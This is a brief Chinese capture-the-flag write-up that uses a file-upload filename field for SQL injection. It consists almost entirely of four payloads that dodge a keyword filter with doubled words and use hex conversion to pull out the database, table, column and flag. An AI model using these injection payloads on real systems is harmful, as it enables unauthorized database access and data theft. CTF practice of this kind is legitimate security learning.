好难的一道题（利用回显进行sql注入）

```
1. 库名
file_name' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
# 得到库名：web_upload

2. 表名
file_name'+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
# 得到表名：hello_flag_is_here

3. 字段
file_name'+(seleselectct+conv(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 1,1)),1,12),16,10))+'.jpg
# 得到字段名：i_am_flag

4. 获得数据
file_name'+(seleselectct+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
# 得到flag：!!_@m_Th.e_F!lag
```